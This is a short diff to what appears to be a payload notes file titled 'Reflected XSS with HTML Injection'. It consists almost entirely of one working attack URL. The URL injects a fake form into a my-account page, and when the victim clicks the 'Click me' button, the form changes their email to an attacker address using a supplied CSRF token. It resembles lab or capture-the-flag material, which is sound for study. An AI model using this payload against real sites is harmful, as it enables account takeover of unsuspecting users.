@@ -1,3 +1,4 @@
-// This is an example of changing the email address of the victim who clicks the “Click Me” button.
+# Reflected XSS with HTML Injection 
+# This is an example of changing the email address of the victim who clicks the “Click Me” button.
 
 https://page.net/my-account?email="></form><form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST"><input required type="email" name="email" value="hacker@evil-user.net"><input required type="hidden" name="csrf" value="rzFn8zdoAD5HP2Zu04OBgmEmHv3UXMmr"><button class='button' type='submit'>Click me</button></form><!--
